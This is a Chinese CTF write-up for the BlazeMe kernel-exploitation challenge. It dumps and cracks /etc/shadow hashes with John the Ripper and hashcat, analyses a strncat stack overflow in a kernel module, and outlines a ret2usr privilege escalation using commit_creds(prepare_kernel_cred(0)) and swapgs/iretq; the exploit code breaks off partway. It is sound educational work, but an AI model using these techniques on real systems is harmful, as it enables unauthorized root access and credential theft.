<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>blazeme.writeup-lipeng</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<h1 id="blazeme-write-up">blazeme write up</h1>
<p>题目来自：<a
href="https://akulpillai.com/posts/learning_through_challenges1/">Kernel
Exploitation Basics - BlazeMe (Blaze CTF 2018)</a></p>
<h2 id="start-and-check">1.start and check</h2>
<p>解压后得到,run.sh文件，内容如下：</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/qemu-system-x86_64</span> <span class="at">-kernel</span> bzImage <span class="at">-smp</span> 1 <span class="at">-hda</span> rootfs.ext2 <span class="at">-boot</span> c <span class="at">-m</span> 64M <span class="at">-append</span> <span class="st">&quot;root=/dev/sda nokaslr rw ip=10.0.2.15:10.0.2.2:10.0.2.2 console=tty1 console=ttyAMA0&quot;</span> <span class="at">-net</span> nic,model=ne2k_pci <span class="at">-net</span> user <span class="at">-nographic</span></span></code></pre></div>
<p>启动后，</p>
<pre class="textile"><code>ash@ash-VirtualBox:~/03.ctf/10.kernel/02.BlazeMe/images$ ./run.sh
WARNING: Image format was not specified for &#39;rootfs2.ext2&#39; and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the &#39;raw&#39; format explicitly to remove the restrictions.
c[?7l[2J[0mSeaBIOS (version 1.13.0-1ubuntu1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+03F8C8B0+03ECC8B0 CA00



Booting from ROM..c[?7l[2J
Welcome to Buildroot
buildroot login:</code></pre>
<p>但是我们不知道密码</p>
<p>mount rootfs.ext2</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> ext2 rootfs.ext2 /mnt</span></code></pre></div>
<p>得到shadow内容：</p>
<pre class="textile"><code>root@ash-VirtualBox:etc# cat shadow
root:$1$e/PZp3rh$CR8gdbpccVdelN0TlcZNt/:17641:0:99999:7:::
daemon:*:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
sys:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
mail:*:10933:0:99999:7:::
www-data:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
blazeme:$1$EA9suiS5$RbHIBskfkDaWjII62rmlo0:17641:0:99999:7:::</code></pre>
<h2 id="get-password-through-force-way">2. get password through force
way</h2>
<p>john the ripper:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">unshadow</span> passwd shadow <span class="op">&gt;</span>/tmp/unshadow.txt</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@ash-VirtualBox:etc#</span> john /tmp/unshadow.txt</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Created</span> directory: /root/.john</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Loaded</span> 2 password hashes with 2 different salts <span class="er">(</span><span class="ex">md5crypt</span> [MD5 32/64 X2]<span class="kw">)</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> <span class="st">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">guest</span>            <span class="er">(</span><span class="ex">blazeme</span><span class="kw">)</span></span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">1g</span> 0:00:01:23 3/3 0.01190g/s 11809p/s 11839c/s 11839C/s bh2571..bh2560</span></code></pre></div>
<p>这里可以获得blazeme的密码是guest</p>
<p>hashcat：</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="at">-m</span> 500 <span class="at">-a</span> 3 <span class="at">--force</span> <span class="at">-o</span> /tmp/rst.txt /tmp/pw.txt</span></code></pre></div>
<p>文件 /tmp/pw.txt的内容：</p>
<pre class="textile"><code>$1$e/PZp3rh$CR8gdbpccVdelN0TlcZNt/
$1$EA9suiS5$RbHIBskfkDaWjII62rmlo0</code></pre>
<p>执行结果：</p>
<pre class="textile"><code>Session..........: hashcat
Status...........: Exhausted
Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: /tmp/pw.txt
Time.Started.....: Sat Jun  4 17:17:47 2022 (1 sec)
Time.Estimated...: Sat Jun  4 17:17:48 2022 (0 secs)
Guess.Mask.......: ?1?2 [2]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
Guess.Queue......: 2/15 (13.33%)
Speed.#1.........:     3460 H/s (1.24ms) @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 4464/4464 (100.00%)
Rejected.........: 0/4464 (0.00%)
Restore.Point....: 36/36 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:61-62 Iteration:875-1000
Candidates.#1....: Xa -&gt; Xq

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</code></pre>
<p>但是爆破root密码比较慢，这里应该是无法爆破，因此我们还是老老实实打pwn吧。</p>
<h2 id="change-for-debug">3.change for debug</h2>
<p>为例本地调试，我们将mount rootfs.ext2
./tmpfs，然后修改shadow中的root密码为guest。</p>
<pre class="textile"><code>root:$1$EA9suiS5$RbHIBskfkDaWjII62rmlo0:17641:0:99999:7:::
daemon:*:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
sys:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
mail:*:10933:0:99999:7:::
www-data:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
blazeme:$1$EA9suiS5$RbHIBskfkDaWjII62rmlo0:17641:0:99999:7:::</code></pre>
<p>查询函数blazeme_read和blazeme_write的offset。</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Booting</span> from ROM..</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> to Buildroot</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">buildroot</span> login: root</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> </span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="co"># id</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span><span class="ex">,10</span><span class="er">(</span><span class="ex">wheel</span><span class="kw">)</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="co"># cat /proc/kallsyms |grep blaze</span></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc0000190</span> t blazeme_open [blazeme]</span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc00002f0</span> t cleanup_module   [blazeme]</span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc00001a0</span> t init_module  [blazeme]</span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc0000010</span> t blazeme_read [blazeme]</span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc0000000</span> t blazeme_close    [blazeme]</span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc00001a0</span> t blazeme_init [blazeme]</span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc0000050</span> t blazeme_write    [blazeme]</span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffffc00002f0</span> t blazeme_exit [blazeme]</span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a><span class="co"># </span></span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="co"># cat /proc/kallsyms |grep _text</span></span>
<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff81000000</span> T _text</span>
<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff8101d160</span> T alternatives_text_reserved</span>
<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff8103e290</span> T set_kernel_text_rw</span>
<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff8103e2d0</span> T set_kernel_text_ro</span>
<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff81060550</span> T core_kernel_text</span>
<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff810605b0</span> T kernel_text_address</span>
<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff81060630</span> T __kernel_text_address</span>
<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff81060670</span> T func_ptr_is_kernel_text</span>
<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a><span class="ex">ffffffff8107cb50</span> t msg_print_text</span></code></pre></div>
<p>blazem_write的offset=0xffffffffc0000050-0xffffffff81000000</p>
<p>此外，我们也可以通过 extract-vmlinux得到内核 二进制文件</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./extract-vmlinux.sh</span> images/bzImage <span class="op">&gt;</span>vmlinux_blazeme</span></code></pre></div>
<h2 id="analyst-and-vuln">4.analyst and vuln</h2>
<p>源码可以得到，strcat为校验str的大小，导致栈溢出：</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> blazeme_write<span class="op">(</span><span class="kw">struct</span> file <span class="op">*</span>file<span class="op">,</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">const</span> <span class="dt">char</span> __user <span class="op">*</span>buf<span class="op">,</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">size_t</span> count<span class="op">,</span> loff_t <span class="op">*</span>ppos<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">512</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;Hello &quot;</span><span class="op">;</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">ssize_t</span> ret <span class="op">=</span> ERR_BLAZEME_OK<span class="op">;</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>buf <span class="op">==</span> NULL<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;blazeme_write get a null ptr: buffer</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        ret <span class="op">=</span> ERR_BLAZEME_OK<span class="op">;</span></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">goto</span> out<span class="op">;</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>count <span class="op">&gt;</span> KBUF_LEN<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;blazeme_wrtie invaild paramter count (%zu)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> count<span class="op">);</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>        ret <span class="op">=</span> ERR_BLAZEME_OK<span class="op">;</span></span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>        <span class="cf">goto</span> out<span class="op">;</span></span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> </span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>    kbuf <span class="op">=</span> NULL<span class="op">;</span></span>
<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>    kbuf <span class="op">=</span> kmalloc<span class="op">(</span>KBUF_LEN<span class="op">,</span> GFP_KERNEL<span class="op">);</span></span>
<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>kbuf <span class="op">==</span> NULL<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;blazeme_write malloc fail</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a>        ret <span class="op">=</span> ERR_BLAZEME_MALLOC_FAIL<span class="op">;</span></span>
<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a>        <span class="cf">goto</span> out<span class="op">;</span></span>
<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>copy_from_user<span class="op">(</span>kbuf<span class="op">,</span> buf<span class="op">,</span> count<span class="op">))</span> <span class="op">{</span></span>
<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a>        kfree<span class="op">(</span>kbuf<span class="op">);</span></span>
<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a>        kbuf <span class="op">=</span> NULL<span class="op">;</span></span>
<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>        <span class="cf">goto</span> out<span class="op">;</span></span>
<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>kbuf <span class="op">!=</span> NULL<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>        strncat<span class="op">(</span>str<span class="op">,</span> kbuf<span class="op">,</span> strlen<span class="op">(</span>kbuf<span class="op">));</span></span>
<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;%s&quot;</span><span class="op">,</span> str<span class="op">);</span></span>
<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="op">(</span><span class="dt">ssize_t</span><span class="op">)</span>count<span class="op">;</span></span>
<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a>out<span class="op">:</span></span>
<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>漏洞发生在代码行：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>strncat<span class="op">(</span>str<span class="op">,</span> kbuf<span class="op">,</span> strlen<span class="op">(</span>kbuf<span class="op">));</span></span></code></pre></div>
<p>如果内核堆上的buf连贯在一起了，那么久可以导致strlen(kbuf)的长度大于512.</p>
<p>可能发生不？是可以发生的，因为申请的内核堆内存并没有被释放，只需要不停的申请，可导致kbuf相连续的内存都被填充为非零数据。</p>
<p>但是如何攻击？</p>
<p>作者给出了非常有意思的思路：</p>
<p>1、mmap一个内存区域，并指定start地址mapp_start_addr，根据对齐结果，mapp_start_addr地址一定会被申请出来</p>
<p>2、mmap的内存区域设置为可执行可读可写</p>
<p>3、找到类似push
mapp_start_addr；ret的gadget，我们这里找是：0xffffffff814b4524 : push
0x5dffc515 ; ret</p>
<p>4、将地址0xffffffff814b4524作为返回值，去覆盖内核栈上的返回值（本次内核没有sp保护）。此时，mapp_start_addr=0x5dffc515</p>
<p>5、我们在mmap的内存区域，准确mapp_start_addr起始的内存上写shellcode。但是写什么shellcode呢？由于我们在调用commit_creds(prepare_kernel_creds(0))的代码是在用户态进行的，因此需要将代码跳转到用户代码空间，这样执行如下函数才不会失败：</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="dt">void</span> <span class="op">*)</span> <span class="op">=</span> <span class="bn">0xffffffff81063b50</span><span class="op">;</span><span class="co">//T prepare_kernel_cred</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> <span class="op">*(*</span>commit_creds<span class="op">)(</span><span class="dt">void</span><span class="op">*)=</span><span class="bn">0xffffffff81063960</span><span class="op">;</span><span class="co">// T commit_creds</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> get_root<span class="op">()</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>    commit_creds<span class="op">(</span>prepare_kernel_cred<span class="op">(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span></code></pre></div>
<p>6、按照这样的方式执行，此时我们无法正常从内核返回了（栈被破坏了，栈不平衡了），因此需要执行异常iretq从内核返回到用户空间。因此需要执行如下的代码：</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span>    <span class="st">&quot;swapgs</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;mov $tf,%rsp</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;iretq</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span></code></pre></div>
<p>有2点非常重要：</p>
<p>1、需要执行swapgs，进行内核和用户态切换，从新执行swapgs为切换到用户态做准</p>
<p>2、执行iretq（中断异常退出），需要栈上保存rip、cs、flag、ss和rsp信息，即trap
frame信息，我们通过mov
$tf,%rsp实现栈迁移，从内核空间迁移到用户空间。</p>
<p>需要注意，因为执行的strcat，有个“Hello
”字符，6个字节，因此地址符号需要偏移2个字节，可以通过如下的方式进行处理：</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> in_buf<span class="op">[</span><span class="dv">64</span><span class="op">]</span> <span class="op">={</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint64_t</span> out_msg<span class="op">[</span><span class="dv">8</span><span class="op">*</span><span class="dv">3</span><span class="op">];</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint64_t</span> msg2<span class="op">[</span><span class="dv">8</span><span class="op">];</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>out_msg<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>out_msg<span class="op">));</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>msg2<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>msg2<span class="op">));</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    </span>
